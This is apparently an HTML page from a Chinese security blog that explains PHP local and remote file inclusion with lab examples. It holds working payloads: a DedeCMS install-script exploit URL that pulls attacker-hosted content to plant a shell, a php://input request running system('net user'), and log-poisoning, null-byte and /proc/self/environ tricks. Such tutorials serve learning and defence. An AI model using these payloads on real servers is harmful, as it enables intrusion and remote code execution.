@@ -1,0 +1,1465 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="渗透测试,PHP,自动化,文件包含," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="w2n1ck" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="严格来说，文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本文只介绍PHP文件包含漏洞。">
+<meta name="keywords" content="渗透测试,PHP,自动化,文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞总结">
+<meta property="og:url" content="http://byd.dropsec.xyz/2016/07/19/文件包含漏洞总结/index.html">
+<meta property="og:site_name" content="w2n1ck">
+<meta property="og:description" content="严格来说，文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本文只介绍PHP文件包含漏洞。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_2.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_3.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_4.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_5.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_6.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_7.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_10.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_11.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_12.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_13.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_14.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_15.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_16.png">
+<meta property="og:updated_time" content="2017-07-28T11:52:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件包含漏洞总结">
+<meta name="twitter:description" content="严格来说，文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本文只介绍PHP文件包含漏洞。">
+<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/file_include_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2016/07/19/文件包含漏洞总结/"/>
+
+
+
+
+
+  <title>文件包含漏洞总结 | w2n1ck</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w2n1ck</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/daima" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2016/07/19/文件包含漏洞总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w2n1ck">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w2n1ck">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件包含漏洞总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-07-19T23:27:55+08:00">
+                2016-07-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/07/19/文件包含漏洞总结/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/07/19/文件包含漏洞总结/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>严格来说，文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本文只介绍PHP文件包含漏洞。<br><a id="more"></a></p>
+<h1 id="0x01-什么是文件包含漏洞？"><a href="#0x01-什么是文件包含漏洞？" class="headerlink" title="0x01 什么是文件包含漏洞？"></a>0x01 什么是文件包含漏洞？</h1><p>简单的来说，就是我们用一个可控的变量作为文件名并以文件包含的的方式调用了它，漏洞就产生了。以PHP为例文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启了我们就有可能包含远程文件，如果不是我们有可能包含本地的文件。</p>
+<h1 id="0x02-文件包含漏洞产生的原因？"><a href="#0x02-文件包含漏洞产生的原因？" class="headerlink" title="0x02 文件包含漏洞产生的原因？"></a>0x02 文件包含漏洞产生的原因？</h1><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
+<h1 id="0x03-PHP包含漏洞分类"><a href="#0x03-PHP包含漏洞分类" class="headerlink" title="0x03 PHP包含漏洞分类"></a>0x03 PHP包含漏洞分类</h1><p>主要分为两类：</p>
+<pre><code>1、本地文件包含LFI
+2、远程文件包含RFI（需要php.ini中allow_url_include=on）
+</code></pre><p>PHP中四个包含文件的函数：</p>
+<blockquote>
+<p>include(),include_once(),require()和require_once()</p>
+</blockquote>
+<p>它们的区别在于：</p>
+<pre><code>include(),include\_once()在包含文件时，即使遇到错误，下面的代码依然会继续执行；
+而require()和require_once()则会报错，直接退出程序。
+</code></pre><h1 id="0x04-本地文件包含"><a href="#0x04-本地文件包含" class="headerlink" title="0x04 本地文件包含"></a>0x04 本地文件包含</h1><p>测试代码main.php：</p>
+<pre><code>&lt;?php
+echo &quot;Hello,this is file_include test!&quot;;
+//初始化
+define(&quot;ROOT&quot;,dirname(_File_).&apos;/&apos;);
+//加载模块
+$page = $_GET[&apos;page&apos;];
+echo ROOT.$page.&apos;.php&apos;;
+include(ROOT.$page.&apos;.php&apos;)
+?&gt;
+</code></pre><p>在同目录下创建1.php:</p>
+<pre><code>&lt;?php phpinfo();?&gt;
+</code></pre><p>请求/main.php?page=1</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_1.png" alt=""></p>
+<h1 id="0x05-远程文件包含"><a href="#0x05-远程文件包含" class="headerlink" title="0x05 远程文件包含"></a>0x05 远程文件包含</h1><p>基于HTTP协议的测试代码</p>
+<pre><code>&lt;?php
+include($_GET[&apos;url&apos;]);
+?&gt;
+</code></pre><p>在远程主机放入一个2.txt，内容为</p>
+<pre><code>&lt;?php phpinfo();?&gt;
+</code></pre><p>在请求的url参数中传入2.txt的地址<code>http://oacotcyq8.bkt.clouddn.com/2.txt</code><br>返回本机的phpinfo信息。</p>
+<p>远程文件包含还有一种利用PHP输入输出流的利用方式，可以直接执行POST代码，只要执行POST请求<code>main.php?url=php://input</code>,POST的内容为<code>&lt;?php phpinfo();?&gt;</code>,即可打印出phpinfo信息。</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_2.png" alt=""></p>
+<h1 id="0x06-文件包含漏洞实例"><a href="#0x06-文件包含漏洞实例" class="headerlink" title="0x06 文件包含漏洞实例"></a>0x06 文件包含漏洞实例</h1><h3 id="0x06-1-本地文件包含实例"><a href="#0x06-1-本地文件包含实例" class="headerlink" title="0x06_1 本地文件包含实例"></a>0x06_1 本地文件包含实例</h3><p>1.首先有个正常的图片，里面包含一个phpinfo()函数。</p>
+<p>2.打开DVWA上传含恶意代码的图片</p>
+<p>3.利用文件包含访问链接：</p>
+<blockquote>
+<p><a href="http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg" target="_blank" rel="external">http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg</a></p>
+</blockquote>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_3.png" alt=""><br><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_4.png" alt=""></p>
+<h3 id="0x06-2-远程文件包含实例"><a href="#0x06-2-远程文件包含实例" class="headerlink" title="0x06_2 远程文件包含实例"></a>0x06_2 远程文件包含实例</h3><p>以Dedecms的一个远程文件包含漏洞为例</p>
+<p>DedeCms &lt; 5.7-sp1远程文件包含漏洞，在了解这个漏洞之前，我们先了解一下Apache服务器解析文件流程。</p>
+<p>当Apache检测到一个文件有多个扩展名时，比如1.php.bak,会从右向左判断，因为bak扩展名Apache不认识，所以就要向前解析，直到有一个Apache认识的扩展名，如果全部的扩展名都不认识，那么会按照httpd.conf配置中指定的方式进行展示，一般默认的是“text/plain”这种方式。我们了解完这个内容后再来分析下面这个漏洞。</p>
+<p>这个问题出现在install/index.php.bak这个文件。看一下这个文件的代码：</p>
+<pre><code>&lt;php?
+…….
+else if($step==11)
+{
+require_once(‘../data/admin/config_update.php’);
+$rmurl = $updateHost.”dedecms/demodata.{$s_lang}.txt”;
+echo $rmurl;
+$sql_content = file_get_contents($rmurl);
+$fp = fopen($install_demo_name,’w’);
+if(fwrite($fp,$sql_content))
+echo ‘  [√] 存在(您可以选择安装进行体验)’;
+else
+echo ‘  [×] 远程获取失败’;
+unset($sql_content);
+fclose($fp);
+exit();
+……
+?&gt;
+</code></pre><p>在上面的代码中我们看到在step=11中，首先包含了/data/admin/config_update.php这个文件，我们再打开这个文件，内容如下：</p>
+<pre><code>&lt;?php
+/**
+ * 更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询
+ *
+ * @version        $Id: config_update.php 1 11:36 2011-2-21 tianya $
+ * @package        DedeCMS.Administrator
+ * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
+ * @license        http://help.dedecms.com/usersguide/license.html
+ * @link           http://www.dedecms.com
+ */
+
+//更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询
+$updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;;
+$linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;;
+</code></pre><p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_5.png" alt=""></p>
+<p>指定了updateHost变量的值。看起来是没有办法包含的，因为变量是固定值，但是如果我们指定了install_demo_name是config_update.php这文件，并且内容是一个404的文件，情形是怎么样子的呢？</p>
+<p>我们先来访问这个url:<br><code>http://127.0.0.1/ DedeCMS-5.7-UTF8-SP1/uploads/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php</code></p>
+<p>这会让代码到</p>
+<blockquote>
+<p>http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt</p>
+</blockquote>
+<p>中取内容写入到</p>
+<p><code>config_update.php，demodata.a.txt</code>。<br>你可能想要问了<br><code>http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt</code> 这个是什么呢？我们访问一下</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_6.png" alt=""></p>
+<p>其实什么都没有，所以变量覆盖以后，我们打开config_update.php以后，里面已经什么都没有了</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_7.png" alt=""></p>
+<p>这样updataHost变量的值便没有被初始化，那么我们想写什么就写什么了，这样就完成了一个远程文件包含漏洞的利用。构造一个url即可完成攻击：</p>
+<pre><code>http://127.0.0.1/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xxx.php&amp;updateHost=http://192.168.2.3/
+</code></pre><h3 id="0x06-2-1-编写脚本测试"><a href="#0x06-2-1-编写脚本测试" class="headerlink" title="0x06_2.1 编写脚本测试"></a>0x06_2.1 编写脚本测试</h3><p>1.开始测试，打开dedecms，可以正常访问</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_10.png" alt=""></p>
+<p>2.然后检测脚本是否可以正常运行</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_11.png" alt=""></p>
+<p>3.脚本可以正常运行，然后我们测试漏洞是否可以利用成功，我们查看远程服务器的文件，如下图,我们在目录C:\wamp\www\dedecms\demodata.a.txt中写入需要我们写入web服务器中的内容，这样就可以写入xxx.php的文件中，从而达到getshell的目的。</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_12.png" alt=""></p>
+<p>4.攻击者远程IP地址</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_13.png" alt=""></p>
+<p>5.然后我们测试漏洞利用</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_14.png" alt=""></p>
+<p>6.打开web服务器的data目录，可以看到，文件已经成功的写到了web服务器中。DedeCMS-5.7-UTF8-SP1\uploads</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_15.png" alt=""></p>
+<p>7.我们访问一下</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_16.png" alt=""></p>
+<p>8.漏洞利用成功</p>
+<h1 id="0x06-文件包含漏洞利用技巧"><a href="#0x06-文件包含漏洞利用技巧" class="headerlink" title="0x06 文件包含漏洞利用技巧"></a>0x06 文件包含漏洞利用技巧</h1><p>远程文件包含漏洞之所以能够执行命令，就是因为攻击者可以自定义被包含的文件内容。因此，本地文件包含漏洞要想执行命令，也需要找一个攻击者能够控制内容的本地文件。</p>
+<p>目前主要有几下几种常见的技巧：</p>
+<h3 id="0x06-1-PHP包含读文件"><a href="#0x06-1-PHP包含读文件" class="headerlink" title="0x06_1 PHP包含读文件"></a>0x06_1 PHP包含读文件</h3><blockquote>
+<p>php://filter/read=convert.base64-encode/resource=login.php</p>
+</blockquote>
+<h3 id="0x06-2-PHP包含写文件"><a href="#0x06-2-PHP包含写文件" class="headerlink" title="0x06_2 PHP包含写文件"></a>0x06_2 PHP包含写文件</h3><p>包含data://或php://input等伪协议。这需要目标服务器支持，同时要求allow_url_fopen为设置为ON。</p>
+<pre><code>http://ip_address/?page=php://input
+并且POST数据为&lt;?php system(&apos;net user&apos;);?&gt;
+</code></pre><h3 id="0x06-3-包含日志文件"><a href="#0x06-3-包含日志文件" class="headerlink" title="0x06_3 包含日志文件"></a>0x06_3 包含日志文件</h3><p>当某个PHP文件存在文件包含漏洞，却无法上传文件时，这就意味着有包含漏洞却不能拿来利用，这时就可以利用apache日志文件来入侵</p>
+<p>Apache服务器运行后会生成两个日志文件，access.log（访问日志）和error.log(错误日志)，apache会记录下我们的操作，并写入到访问日志access.log之中。</p>
+<p>访问</p>
+<blockquote>
+<p><a href="http://ip_address/?page=../../../../Apache-20/logs/access.log" target="_blank" rel="external">http://ip_address/?page=../../../../Apache-20/logs/access.log</a></p>
+</blockquote>
+<h3 id="0x06-4-截断包含"><a href="#0x06-4-截断包含" class="headerlink" title="0x06_4 截断包含"></a>0x06_4 截断包含</h3><p>只适合于magic_quotes_gpc=off的时候。</p>
+<blockquote>
+<p>hhtp://ip_address/?page=1.jpg%00</p>
+</blockquote>
+<h3 id="0x06-5-PHP内置协议"><a href="#0x06-5-PHP内置协议" class="headerlink" title="0x06_5 PHP内置协议"></a>0x06_5 PHP内置协议</h3><pre><code>file:///var/www/html  访问本地文件系统
+ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLs
+data://  数据流
+http:// — 访问 HTTP(s) URLs
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流
+zlib:// — 压缩流
+data:// — Data (RFC 2397)
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP Archive
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — Audio streams
+expect:// — 处理交互式的流
+</code></pre><h3 id="0x06-6-包含Session文件。"><a href="#0x06-6-包含Session文件。" class="headerlink" title="0x06_6 包含Session文件。"></a>0x06_6 包含Session文件。</h3><p>这部分需要攻击者能够控制部分Session文件的内容，PHP默认生成的Session文件一般存放在/tmp目录下。</p>
+<h3 id="0x06-7-包含-proc-self-environ文件。"><a href="#0x06-7-包含-proc-self-environ文件。" class="headerlink" title="0x06_7 包含/proc/self/environ文件。"></a>0x06_7 包含/proc/self/environ文件。</h3><blockquote>
+<p><a href="http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ" target="_blank" rel="external">http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ</a></p>
+</blockquote>
+<p>这个也是一种通用的技巧，因为它根本不需要猜测被包含文件的路径，同时用户也能控制它的内容，常见的做法是向User-Agent中注入PHP代码来完成攻击。</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>强力推荐一篇文章：<a href="http://www.cnblogs.com/littlehann/p/3665062.html" target="_blank" rel="external">LFI、RFI、PHP封装协议安全问题学习</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="w2n1ck WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="w2n1ck Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      w2n1ck
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2016/07/19/文件包含漏洞总结/" title="文件包含漏洞总结">http://byd.dropsec.xyz/2016/07/19/文件包含漏洞总结/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+          
+            <a href="/tags/自动化/" rel="tag"><i class="fa fa-tag"></i> 自动化</a>
+          
+            <a href="/tags/文件包含/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/07/18/XSS绕过与防御总结/" rel="next" title="XSS绕过与防御总结">
+                <i class="fa fa-chevron-left"></i> XSS绕过与防御总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/07/20/CSRF漏洞总结/" rel="prev" title="CSRF漏洞总结">
+                CSRF漏洞总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="w2n1ck" />
+          <p class="site-author-name" itemprop="name">w2n1ck</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">53</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
